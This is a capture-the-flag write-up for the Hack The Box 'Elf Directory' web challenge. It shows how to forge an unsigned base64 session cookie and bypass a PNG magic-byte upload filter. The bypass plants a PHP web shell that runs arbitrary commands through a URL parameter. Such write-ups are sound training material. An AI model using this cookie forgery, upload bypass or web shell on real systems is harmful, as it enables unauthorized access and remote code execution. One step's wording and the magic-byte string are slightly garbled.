# Elf Directory (300)

## Problem

> Can you infiltrate the Elf Directory to get a foothold inside Santa's data warehouse in the North Pole?

## Solution

1. We do not have a copy of the source code for this challenge, so that makes it more challenging. We go to the website and are greeted with a login message. Let's try clicking on "Create one!", creating an account, and then signing in with that.

2. We see a profile screen with some basic details and a message that says "You don't have permission to edit your profile, contact the admin elf to approve your account!"

3. When viewing the page's HTML and looking for things that are our of place, we see the following JS code:

    ```html
    <script>
        $('#upload').change(function(){
        let path = $(this).val().replace('C:\\fakepath\\', '');
        $('#selectFile').html(path);
        })
    </script>
    ```

    These HTML IDs do not refer to anything on the page so something must be missing.

4. Next, we decide to check how your session remains signed in. There is a cookie called "PHPSESSID", which is common for PHP, with the value `eyJ1c2VybmFtZSI6InRlc3QiLCJhcHByb3ZlZCI6ZmFsc2V9`. This is base64 and when decoded using `base64 -d` shows `{"username":"test","approved":false}`.

5. Let's try setting `approved` to `true` and then encoding it again: `echo '{"username":"test","approved":true}' | base64` returns `eyJ1c2VybmFtZSI6InRlc3QiLCJhcHByb3ZlZCI6dHJ1ZX0K`. Swapping the cookie in the browser's developer tools and reloading the page now shows a "Update profile avatar" file selector.

6. Let's try uploading a new profile picture. Only PNGs are accepted, so there is some file type validation happening. After uploading the image, the page reloads and the profile picture has indeed changed. My image was originally called `Red.png`, but when it is uploaded it is renamed to `073cc_Red.png` and is placed in the `/uploads` directory.

7. So, we have control over the file name, but the application checks for a valid PNG. Let's see how it's doing that file type check by uploading the same picture with the name `Red.png.php`. This is successful, but trying to upload a text file that has `.php` in the name fails.

8. We can go through the file upload methodology discussed on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload). It turns out that the application is checking if the magic bytes of a PNG image are present. So, let's create a file with those bytes and a call to `phpInfo`. The magic bytes for a PNG are `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[` and we can call `phpInfo` with `<?php phpInfo(); ?>`. So, we run `printf "\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[<?php phpInfo(); ?>" > exploit_test.png.php` to get our image/php file/exploit. Uploading this file and then right clicking on our profile file and selecting "Open Image in New Tab" displays the PHP info page. We have achieved remote code execution.

9. So, lets pop a shell instead of showing the info page by running `<?php echo system($_GET['cmd']); ?>` instead of `<?php phpInfo(); ?>`. Create the exploit file with `<?php phpInfo(); ?>`. So, we run `printf "\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[<?php echo system(\$_GET['cmd']); ?>" > exploit.png.php`

10. Uploading and navigating to this image appears to work. Now we can run commands by setting the `cmd` parameter to the command we want to run. So, let's try to find the flag with `http://IP:PORT/uploads/195c2_exploit.png.php?cmd=ls%20-la%20/`. This reveals a file called `flag_65890d927c37c33.txt`. Let's open that file with `http://IP:PORT/uploads/195c2_exploit.png.php?cmd=cat%20/flag_65890d927c37c33.txt`. Running this prints the flag.

### Flag

`HTB{br4k3_au7hs_g3t_5h3lls}`
